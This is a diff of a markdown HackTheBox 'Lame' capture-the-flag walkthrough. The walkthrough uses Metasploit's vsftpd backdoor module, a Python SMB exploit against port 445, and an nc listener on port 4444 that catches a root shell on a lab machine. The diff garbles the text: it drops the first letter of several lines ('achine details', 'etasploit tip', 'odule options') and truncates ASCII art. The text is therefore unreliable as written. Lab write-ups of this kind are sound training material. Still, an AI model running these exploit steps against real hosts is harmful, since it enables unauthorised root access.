@@ -1,15 +1,8 @@
----
-attachments: [nmap.xsl]
-title: HackTheBox Lame Walkthrough
-created: '2020-08-21T13:46:56.185Z'
-modified: '2020-08-22T14:47:04.348Z'
----
-
 # HackTheBox Lame Walkthrough
 
 This is a Walkthrough how I get the user and root flag on the machine. All my scan results are stored in the [attachments](./attachments) folder.
 
-Machine details:
+achine details:
 
 - Machine Name : Lame
 - IP address: 10.10.10.3
@@ -50,12 +43,12 @@ root@Kali:/# msfconsole
 + -- --=[ 566 payloads - 45 encoders - 10 nops            ]
 + -- --=[ 7 evasion                                       ]
 
-Metasploit tip: Use the resource command to run commands from a file
+etasploit tip: Use the resource command to run commands from a file
 
 msf5 > use auxiliary/scanner/smb/smb_version
 msf5 auxiliary(scanner/smb/smb_version) > show options
 
-Module options (auxiliary/scanner/smb/smb_version):
+odule options (auxiliary/scanner/smb/smb_version):
 
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
@@ -89,7 +82,7 @@ I found the following vulnerabilities:
 
 I tried the Metaspoilt modul against the host but the exploit did not work:
 
-```console
+```bash
 root@Kali:/# msfconsole
 
                .;lxO0KXXXK0Oxl:.
@@ -103,7 +96,7 @@ root@Kali:/# msfconsole
 .WMMMMMMMMM:                       :MMMMMMMMMM,
 xMMMMMMMMMo                         lMMMMMMMMMO
 NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
-MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
+MMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
 NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
 xMMMMMMMMMd                        ,0MMMMMMMMMMK;
 .WMMMMMMMMMc                         'OMMMMMM0,
@@ -123,13 +116,13 @@ xMMMMMMMMMd                        ,0MMMMMMMMMMK;
 + -- --=[ 566 payloads - 45 encoders - 10 nops            ]
 + -- --=[ 7 evasion                                       ]
 
-Metasploit tip: View advanced module options with advanced
+etasploit tip: View advanced module options with advanced
 
 msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
 [*] No payload configured, defaulting to cmd/unix/interact
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
 
-Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+odule options (exploit/unix/ftp/vsftpd_234_backdoor):
 
    Name    Current Setting  Required  Description
    ----    ---------------  --------  -----------
@@ -182,7 +175,7 @@ conn.connect(victim_ip, 445)
 
 #### Shell 1: Use the Exploit
 
-```console
+```bash
 root@Kali:/# python3 smb_exploit.py
 ```
 
@@ -190,7 +183,7 @@ root@Kali:/# python3 smb_exploit.py
 
 The session already has ROOT privilege so the only think left is to find the user and root flag on the machine.
 
-```console
+```bash
 root@Kali:/# nc -nlvp 4444
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
